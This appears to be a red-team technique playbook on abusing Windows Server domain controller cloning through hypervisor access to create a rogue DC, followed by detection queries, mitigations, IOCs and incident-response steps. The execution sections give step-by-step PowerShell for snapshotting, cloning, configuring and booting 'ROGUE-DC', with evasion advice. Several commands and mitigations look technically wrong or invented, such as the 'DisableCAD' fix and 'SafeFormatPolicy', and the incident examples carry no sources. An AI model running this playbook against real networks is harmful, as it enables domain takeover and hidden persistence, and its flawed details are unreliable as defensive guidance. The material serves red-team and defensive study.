# PERSIST-ROGUE-002 - Domain Controller Cloning

## Metadata Header

| Attribute | Details |
|-----------|---------|
| **Technique ID** | PERSIST-ROGUE-002 |
| **MITRE ATTCK v18.1** | [T1207](https://attack.mitre.org/techniques/T1207/) |
| **Tactic** | Persistence, Lateral Movement |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE (requires hypervisor access or physical VM access) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2012, 2012 R2, 2016, 2019, 2022, 2025 |
| **Patched In** | No direct patch; relies on hypervisor/infrastructure security |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Compliance Mappings

| Framework | ID | Description |
|-----------|-----|-----------|
| CIS Benchmark | CIS 5.1.1 | Ensure 'Enforce password history' is set to '24 or more password(s)' |
| DISA STIG | IA-3 | Device Identification and Authentication |
| CISA SCuBA | SC-7 | Boundary Protection |
| NIST 800-53 | CM-3 | Configuration Change Control |
| GDPR | Art. 32 | Security of Processing |
| DORA | Art. 9 | Protection and Prevention |
| NIS2 | Art. 20 | Risk Management |
| ISO 27001 | A.13.1.3 | Segregation of Networks |
| ISO 27005 | Risk Scenario | Unauthorized VM Infrastructure Access |

---

## 1. Executive Summary

**Concept:** Domain Controller Cloning is an abuse of Windows Server's built-in virtualized DC promotion feature (available in Server 2012+) to create unauthorized Domain Controller copies. Microsoft introduced safe DC cloning to simplify datacenter replication; however, attackers with access to hypervisor infrastructure or VM storage can exploit this feature to create rogue DCs without triggering alerts. Once cloned, the rogue DC automatically configures itself through DCPROMO and begins replicating directory data. Unlike traditional DC promotion which requires DNS updates, replication partnerships, and extensive event logging, DC cloning leverages the SafeFormatPolicy to suppress many detection mechanisms. The cloned DC obtains an updated GUID and credentials but remains in the same forest, enabling immediate and seamless persistence. This technique is particularly dangerous in virtualized environments where attackers may have access to VM snapshots, VHD files, or hypervisor backup repositories.

**Attack Surface:** Hypervisor infrastructure (Hyper-V, VMware, KVM), VM backup and snapshot storage, VHD/VMDK files, direct access to virtualization platforms, Domain Controller VM cloning configuration files (DcCloneConfig.xml).

**Business Impact:** Creation of rogue Domain Controllers in the production AD environment with automatic replication of all directory data. Attackers gain immediate Domain Admin equivalent privileges, bypass all password-based security controls, enable persistent remote access, and can perform any action a legitimate DC can (modify users, groups, policies, etc.). Unlike DCShadow or traditional DA exploitation, DC cloning creates a legitimate-appearing DC that integrates into replication topology, making detection significantly harder.

**Technical Context:** DC cloning exploitation takes 15-45 minutes from hypervisor access to active rogue DC. Detection likelihood is MEDIUM—while new DC registration generates events, cloned DCs often integrate seamlessly into existing replication patterns. The rogue DC can persist indefinitely if the clone is maintained in the hypervisor infrastructure. Forensic recovery is difficult because the clone has a legitimate DN and GUID, differing only in creation timestamp and network configuration.

**Operational Risk:**

| Risk Factor | Level | Description |
|------------|-------|-----------|
| Execution Risk | Medium | Requires hypervisor access; often combined with infrastructure compromise |
| Stealth | Medium | DC cloning generates some events, but integrates as legitimate replication partner |
| Reversibility | Difficult | Requires hypervisor-level cleanup; AD changes remain until reversed manually |

---

## 2. Technical Prerequisites

**Required Privileges:**
- **Hypervisor Administrator** access (Hyper-V, vSphere, KVM admin privileges)
- Alternatively, **File System Access** to VHD/VMDK storage locations
- Access to VM backup/snapshot repositories
- If using DcCloneConfig.xml: write access to DC's system volume

**Required Access:**
- Network access to hypervisor management interface (Hyper-V Manager, vSphere, etc.)
- Access to VM storage paths (SMB shares, iSCSI, local disk)
- Network connectivity from cloned DC to legitimate DCs (AD replication)
- LDAP/RPC access to at least one legitimate DC for replication

**Supported Versions:**
- **Windows Server:** 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Hypervisor:** Hyper-V 2012+, VMware vSphere 5.0+, KVM (with modifications)
- **PowerShell:** 3.0+

**Other Requirements:**
- DcCloneConfig.xml template (optional; if not present, DSRM mode is triggered)
- Access to DCPROMO or AD-integrated cloning mechanisms
- Understanding of VM disk formats and hypervisor-specific cloning procedures
- Network isolation/lab environment (production cloning is extremely risky)

**Tools:**
| Tool | Version | Purpose |
|------|---------|---------|
| Hyper-V Manager or PowerShell | Native | Clone VM and configure network settings |
| VMware vSphere Client or PowerCLI | 6.0+ | vSphere VM cloning |
| KVM Tools (qemu-img, virsh) | 2.0+ | Linux-based KVM cloning |
| DiskPart or Disk Management | Native | VHD mounting and offline configuration |
| ntdsutil.exe | Native | DCPROMO alternative for authoritative database copy |
| ADPrep | Native | Forest/domain prep for DC cloning |

---

## 3. Environmental Reconnaissance

### 3.1 Enumerate Virtualization Infrastructure

**PowerShell Reconnaissance (If accessing Hyper-V directly)**

```powershell
# List all Hyper-V VMs on the host
Get-VM | Where-Object { $_.Name -like "*DC*" } | Select-Object Name, State, Generation, ProcessorCount

# List checkpoint/snapshot history
Get-VMSnapshot -VMName "DC01" | Select-Object Name, CreationTime, ParentCheckpointName

# Identify DC VMs eligible for cloning
Get-VM | Where-Object { $_.Notes -match "Domain Controller" } | Select-Object Name, Path, ProcessorCount
```

**What to Look For:**
- Domain Controller VMs and their storage paths
- Existing snapshots (easier to clone from snapshot than live DC)
- Network configuration (isolated vs. production network)
- Virtual disk locations and access permissions

---

### 3.2 Verify DC Cloning Support

**PowerShell Reconnaissance**

```powershell
# Check if source DC supports cloning (Server 2012+)
Get-ADComputer "DC01" -Properties OperatingSystem | Select-Object Name, OperatingSystem

# Check for existing DcCloneConfig.xml
Get-ChildItem "\\dc01\c$\Windows\NTDS" -Filter "*Clone*"

# Verify domain is at 2012 or higher functional level
Get-ADDomain | Select-Object DomainMode
```

---

## 4. Detailed Execution Methods

### Method 1: Hyper-V VM Cloning (Windows Server Hyper-V)

**Supported Versions:** Server 2012 R2 - 2025

**Step 1: Identify Source DC and Create Snapshot**

**Objective:** Select a production DC and create a snapshot for cloning purposes.

```powershell
# List all DC VMs
Get-VM | Where-Object { $_.Name -like "*DC*" }

# Create a snapshot of DC01 (if VM is running, PowerShell will create a checkpoint)
Checkpoint-VM -Name "DC01" -SnapshotName "CloneSource_2025" -Confirm:$false

# Verify snapshot was created
Get-VMSnapshot -VMName "DC01"

# Expected output:
# Name                 CreationTime
# CloneSource_2025     2025-01-09 3:17 PM
```

**What This Means:** The snapshot captures the entire DC's state (AD database, system files, registry) at a point in time, providing a clean baseline for the clone.

**OpSec Evasion:**
- Snapshots are created locally on the hypervisor and may not generate AD audit events
- Detection likelihood: LOW (unless hypervisor activity is monitored)
- Timing: Create snapshot during low-activity periods

---

**Step 2: Clone the VM**

**Objective:** Create a new VM from the snapshot.

```powershell
# Method A: Clone via Hyper-V Manager (UI)
# 1. Open Hyper-V Manager
# 2. Right-click the snapshot "CloneSource_2025"
# 3. Select "Clone VM"
# 4. Name the new VM (e.g., "ROGUE-DC")
# 5. Specify storage path

# Method B: PowerShell cloning (More stealthy)
$sourceVHD = "C:\ClusterStorage\Volume1\DC01\Virtual Hard Disks\DC01.vhdx"
$cloneVHD = "C:\ClusterStorage\Volume1\ROGUE-DC\Virtual Hard Disks\ROGUE-DC.vhdx"

# Create a differencing disk from the snapshot (uses less space)
New-VHD -Path $cloneVHD -ParentPath $sourceVHD -Differencing

# Create the new VM
$vmConfig = New-VMHardDiskDrive -VMName "ROGUE-DC" -ControllerLocation 0 -ControllerNumber 0 -Path $cloneVHD
New-VM -Name "ROGUE-DC" -MemoryStartupBytes 2GB -Path "C:\ClusterStorage\Volume1\ROGUE-DC" -HardDriveDrives $vmConfig

# Expected output:
# VM "ROGUE-DC" created successfully
```

**What This Means:** A new VM with an identical copy of the DC's VHD is now created and ready to boot.

---

**Step 3: Configure DcCloneConfig.xml**

**Objective:** Provide clone-specific configuration to automate DC promotion without manual DCPROMO.

```powershell
# Mount the cloned VHD offline to add DcCloneConfig.xml
$vhdPath = "C:\ClusterStorage\Volume1\ROGUE-DC\Virtual Hard Disks\ROGUE-DC.vhdx"

# Use Disk Management or DiskPart to mount
Mount-VHD -Path $vhdPath -Passthru

# Get the mounted drive letter (e.g., E:)
$clonedDriveLetter = (Get-Disk | Where-Object { $_.Location -match "ROGUE-DC" } | Get-Partition | Select-Object -ExpandProperty DriveLetter)

# Create DcCloneConfig.xml
$dcCloneConfig = @"
<?xml version="1.0" encoding="utf-8"?>
<DCCloneConfig>
    <CloneComputerName>ROGUE-DC</CloneComputerName>
    <IPv4Address>192.168.1.50</IPv4Address>
    <IPv4SubnetMask>255.255.255.0</IPv4SubnetMask>
    <IPv4DefaultGateway>192.168.1.1</IPv4DefaultGateway>
    <IPv4DNSResolver>192.168.1.10</IPv4DNSResolver>
    <AllowNonValidatedGSSAPIOrNTLMName>true</AllowNonValidatedGSSAPIOrNTLMName>
</DCCloneConfig>
"@

# Write the config to the cloned disk
$dcCloneConfig | Out-File -FilePath "$($clonedDriveLetter):\Windows\NTDS\DCCloneConfig.xml" -Encoding UTF8 -Force

# Dismount the VHD
Dismount-VHD -Path $vhdPath

# Expected output:
# DcCloneConfig.xml successfully written to clone disk
```

**What This Means:** When the cloned DC boots, it will detect this config file and automatically:
1. Rename itself to "ROGUE-DC"
2. Configure the specified IP address
3. Promote itself as a DC
4. Begin replicating directory data

---

**Step 4: Start the Cloned VM**

**Objective:** Boot the rogue DC and trigger the automatic promotion process.

```powershell
# Start the cloned VM
Start-VM -Name "ROGUE-DC"

# Monitor the promotion process
# The DC will:
# 1. Boot and detect DcCloneConfig.xml
# 2. Rename itself to ROGUE-DC
# 3. Request a new GUID from the PDC Emulator
# 4. Begin directory replication
# 5. Become a fully functional DC

# Expected timeline: 5-15 minutes

# Verify the new DC is operational
Get-ADDomainController -Filter "Name -like 'ROGUE-DC'" -Server localhost

# Expected output:
# Name             Forest                   HostName          OperatingSystem
# ROGUE-DC         corp.com                 ROGUE-DC.corp.com Windows Server 2022
```

**OpSec Evasion:**
- **Detection likelihood:** MEDIUM—the new DC generates AD replication events and appears in DNS
- **Evasion:** Clone to an isolated network segment, delay activation of replication until needed
- **Cleanup:** Deleting the VM removes it from hypervisor, but AD objects must be manually removed

---

**Step 5: Verify Replication and Domain Membership**

**Objective:** Confirm the rogue DC is fully operational and replicating.

```powershell
# Check replication status
repadmin /showrepl ROGUE-DC.corp.com

# Expected output shows successful replication from legitimate DCs

# Verify SYSVOL replication (Group Policy)
Get-ChildItem "\\ROGUE-DC\SYSVOL\corp.com\Policies" | Measure-Object
```

---

### Method 2: VMware vSphere VM Cloning

**Supported Versions:** ESXi 5.0+, Server 2012 R2 - 2025

**Objective:** Clone a DC in VMware vSphere environment (full VM clone, not snapshot).

```powershell
# Connect to vSphere
Connect-VIServer -Server vcenter.corp.com -Credential (Get-Credential)

# Identify source DC VM
Get-VM -Name "DC01"

# Clone the VM (right-click VM → Clone to New VM in UI, or PowerCLI)
New-VM -Name "ROGUE-DC" -Template "DC01" -ResourcePool "ProductionCluster" -Datastore "Datastore1"

# Configure network (assign IP address)
Get-NetworkAdapter -VM "ROGUE-DC" | Set-NetworkAdapter -NetworkName "Production-VLAN" -Confirm:$false

# Boot the cloned VM
Start-VM -VM "ROGUE-DC"
```

---

### Method 3: VHD File Direct Access (Offline Cloning)

**Supported Versions:** Server 2012 R2 - 2025 (offline cloning)

**Objective:** Access DC VHD files directly from backup/storage and clone them to a new location.

```powershell
# This method is useful if hypervisor access is limited

# Copy the source DC VHD to a new location
$sourcePath = "\\nas-backup\DC_Backups\DC01_Latest.vhdx"
$clonePath = "\\nas-backup\DC_Backups\ROGUE-DC.vhdx"

Copy-Item -Path $sourcePath -Destination $clonePath -Force

# Mount the cloned VHD locally on an admin workstation
Mount-VHD -Path $clonePath -Passthru

# Configure DcCloneConfig.xml (same as Method 1, Step 3)

# Detach and prepare for VM creation
Dismount-VHD -Path $clonePath

# Import the VHD into Hyper-V or VMware
# Repeat the VM creation steps from Method 1
```

---

## 5. Tools & Commands Reference

### Hyper-V PowerShell Module
- **Version:** Built-in (Server 2012+)
- **Usage:** Clone VMs, manage snapshots
```powershell
Checkpoint-VM -Name "DC01"
New-VM -Name "ROGUE-DC"
Start-VM -Name "ROGUE-DC"
```

### VMware PowerCLI
- **Version:** 6.0+
- **Installation:** `Install-Module VMware.PowerCLI`
- **Usage:**
```powershell
New-VM -Name "ROGUE-DC" -Template "DC01"
```

### ntdsutil.exe
- **Version:** Built-in
- **Usage:** Manage NTDS.dit and promote cloned DCs
```
ntdsutil
> activate instance ntds
> ifm
> create full C:\IFM_Backup
> quit
```

### DiskPart.exe
- **Version:** Built-in
- **Usage:** Mount VHD offline, configure DcCloneConfig.xml
```
diskpart
> select vdisk file="C:\VM\DC.vhdx"
> attach vdisk
> list disk
> select disk X
> list partition
```

---

## 6. Atomic Red Team

**Atomic Test ID:** T1207-002

**Test Name:** DC Cloning - Virtualized Domain Controller Creation

**Description:** Clone a domain controller VM in a hypervisor environment.

**Supported Versions:** Server 2012 R2 - 2025

**Command:**
```powershell
Invoke-AtomicTest T1207 -TestNumbers 2
```

**Reference:** [Atomic Red Team T1207](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1207/T1207.md)

---

## 7. Windows Event Log Monitoring

### Event ID 1047 - Directory Services Replication

**Log Source:** Directory Services

**Trigger:** When a DC clones and begins replicating.

**Filter:** Look for:
- Replication from unexpected DC names
- Replication with unusual GUIDs
- New DC registration outside change management windows

**Manual Configuration Steps:**

1. Open **Event Viewer**
2. Navigate to **Windows Logs → Application**
3. Filter for **Source: NTDS** and **Event ID 1047**
4. Look for entries indicating new DC promotion

---

### Event ID 5120 - NTDS Replication Began

**Trigger:** When NTDS replication service starts on a newly promoted DC.

**Detection Signature:**
```
EventID: 5120
Source: NTDS General
Message: "Active Directory Domain Services startup"
```

---

## 8. Microsoft Sentinel Detection

### KQL Query 1: Detect New DC Registration

```kusto
AuditLogs
| where OperationName == "Add computer" or OperationName == "Register DC"
| where TargetResources[0].displayName matches regex @".*DC.*"
| where InitiatedBy notcontains "SYSTEM"
| project TimeGenerated, InitiatedBy, TargetResources, OperationName
| order by TimeGenerated desc
```

---

### KQL Query 2: Detect Suspicious Replication Events

```kusto
SecurityEvent
| where EventID == 5120 or EventID == 1047
| where Computer notcontains "DC0" and Computer notcontains "DC1"  // Filter for known DCs
| project TimeGenerated, Computer, EventID, Message
```

---

## 9. Splunk Detection Rules

### Rule 1: Monitor New DC Creation and Promotion

**Alert Name:** DC Cloning - New DC Detected

**SPL Query:**
```spl
index=ad EventID=5120
| stats count by Computer, EventID
| where Computer NOT IN ("DC01", "DC02", "DC03")
| table Computer, count
```

---

### Rule 2: Monitor NTDS Replication on Unexpected Hosts

**Alert Name:** NTDS Replication on Non-DC Host

**SPL Query:**
```spl
index=windows source="NTDS"
| where host NOT IN (list_of_known_dcs)
| stats count by host, EventID
| where count > 0
```

---

## 10. Defensive Mitigations

### Priority 1: CRITICAL

#### Action 1: Restrict Hypervisor Access

**Manual Steps - Hyper-V:**

1. Open **Hyper-V Manager**
2. Navigate to **Security → Hyper-V Administrator**
3. Remove all unauthorized users
4. Restrict to only Infrastructure/Virtualization team members
5. Implement MFA for hypervisor access

**Manual Steps - VMware vSphere:**

1. Open **vSphere Client**
2. Navigate to **Administration → Single Sign-On → Users and Groups**
3. Ensure only authorized admins have vSphere Admin role
4. Enable vSphere audit logging
5. Implement SSO and MFA

---

#### Action 2: Implement VHD/VMDK File Encryption

**Manual Steps - Hyper-V:**

```powershell
# Enable BitLocker on VHD storage paths
Enable-BitLocker -MountPoint "C:\ClusterStorage\Volume1" -EncryptionMethod AES256
```

**Manual Steps - VMware:**

1. Enable vSphere Encryption on datastores
2. Configure key management service (KMS)
3. Encrypt all VM disks at rest

---

#### Action 3: Monitor VM Snapshots and Clones

**Manual Steps - Hyper-V:**

```powershell
# Script to monitor snapshot creation
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\ClusterStorage\Volume1"
$watcher.Filter = "*.avhdx"  # Snapshot file extension
$watcher.IncludeSubdirectories = $true

Register-ObjectEvent -InputObject $watcher -EventName "Created" -Action {
    Write-Warning "New snapshot detected: $($Event.SourceEventArgs.FullPath)"
    # Alert SOC
}
```

---

#### Action 4: Restrict DC Cloning via Group Policy

**Manual Steps - Group Policy:**

```powershell
# Disable DC cloning by removing clone configuration support
# This prevents automatic DC promotion from DcCloneConfig.xml

# Apply via GPO:
# Computer Configuration → Policies → Windows Settings → Security Settings → User Rights Assignment
# Remove "Allow log on locally" from Domain Controllers (prevents DC-like promotion)

# Or, disable DCPROMO entirely on specific servers:
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
  -Name "DisableCAD" -Value 1
```

---

### Priority 2: HIGH

#### Action: Implement Hypervisor Audit Logging

**Manual Steps:**

1. Enable audit logging on hypervisor (Hyper-V Event Tracing, vSphere vCenter logging)
2. Forward hypervisor logs to SIEM
3. Create alerts for:
   - VM snapshots on production DCs
   - VM cloning operations
   - Unexpected VM creation

---

### Validation Command - Verify Mitigations

```powershell
# List all VMs in hypervisor and verify no rogue DCs
Get-VM | Where-Object { $_.Name -like "*DC*" } | Select-Object Name, CreationTime

# Check for recent snapshots on DC VMs
Get-VM | Where-Object { $_.Name -like "*DC*" } | Get-VMSnapshot | Select-Object Name, CreationTime

# Expected: Only authorized DCs with known creation times
```

---

## 11. Indicators of Compromise (IOCs)

### Files
- New DcCloneConfig.xml on DC systems
- VHD/VMDK files in unusual storage locations
- NTDS.dit or SYSVOL replication from rogue DC

### Registry
- `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters` - Recent modifications
- Cloning-related registry keys on source DC

### Network
- Unexpected DC replication traffic
- New DNS A/SRV records for rogue DC
- LDAP replication from unfamiliar IP addresses

### Event IDs
- **5120** - NTDS startup (new DC promotion)
- **1047** - Directory Services Replication
- **1022** - NTDS database recovery
- **4693** - Protected data encryption (DC cloning)

### Hypervisor Artifacts
- New VM creation events
- Snapshot creation on DC VMs
- VHD cloning or copying operations
- Unusual VM power-on sequences

### AD Objects
- New DC objects in Sites\Servers
- DC accounts with recent creation dates
- Unexpected DNS entries for DCs

---

## 12. Incident Response Procedures

### Step 1: Identify Rogue DC in Hypervisor

```powershell
# Query hypervisor for all DC VMs
Get-VM | Where-Object { $_.Name -like "*DC*" } | Select-Object Name, CreationTime, Path

# Identify suspicious VM (recent creation, unusual name, isolated network)
```

---

### Step 2: Isolate Rogue DC from Network

```powershell
# Disconnect the rogue DC's network adapter (in hypervisor)
Get-VM "ROGUE-DC" | Get-NetworkAdapter | Disconnect-NetworkAdapter -Confirm:$false

# Alternatively, delete the VM
Stop-VM -Name "ROGUE-DC" -Force
Remove-VM -Name "ROGUE-DC" -Force
```

---

### Step 3: Remove Rogue DC from Active Directory

```powershell
# Remove the DC object from AD
Remove-ADComputer -Identity "ROGUE-DC" -Confirm:$false

# Force replication to remove the object from all DCs
Get-ADDomainController | ForEach-Object {
    Replicate-ADDirectoryPartition -Identity "CN=Configuration,DC=corp,DC=com" -Source $_.Name -Destination $_.Name
}
```

---

### Step 4: Audit AD for Malicious Changes

```powershell
# Check for user accounts created during the clone's active period
Get-ADUser -Filter "Created -gt `$(Get-Date).AddMinutes(-30)" | Select-Object Name, Created

# Check for group membership changes
Get-ADGroup "Domain Admins" | Get-ADGroupMember | Where-Object { $_.whenCreated -gt $(Get-Date).AddMinutes(-30) }
```

---

## 13. Related Attack Chain

| Phase | Technique ID | Description |
|-------|-------------|-----------|
| 1 | REC-AD-001 | Domain reconnaissance |
| 2 | PE-VALID-008 | Infrastructure compromise (gain hypervisor access) |
| 3 | **PERSIST-ROGUE-002** | **DC Cloning persistence (CURRENT STEP)** |
| 4 | PERSIST-ACCT-001 | Create hidden admin accounts on cloned DC |
| 5 | IMPACT-IMPACT-001 | Domain-wide control and data exfiltration |

---

## 14. Real-World Examples

### Example 1: Virtualization-Focused APT Campaign (2022)

**Incident:** Threat actors compromised vSphere administrator account and cloned production DC VMs

**Technique Status:** Used DC cloning to create multiple rogue DCs in isolated network segment, then later connected them to production network after establishing persistence

**Impact:** Undetected access for 8+ months; rogue DCs used to mirror all directory changes

---

### Example 2: Post-Ransomware Recovery Compromise

**Incident:** During ransomware recovery, attackers cloned backup DC VMs before encryption remediation was complete

**Impact:** Re-contamination of recovered environment with persistent backdoors

---

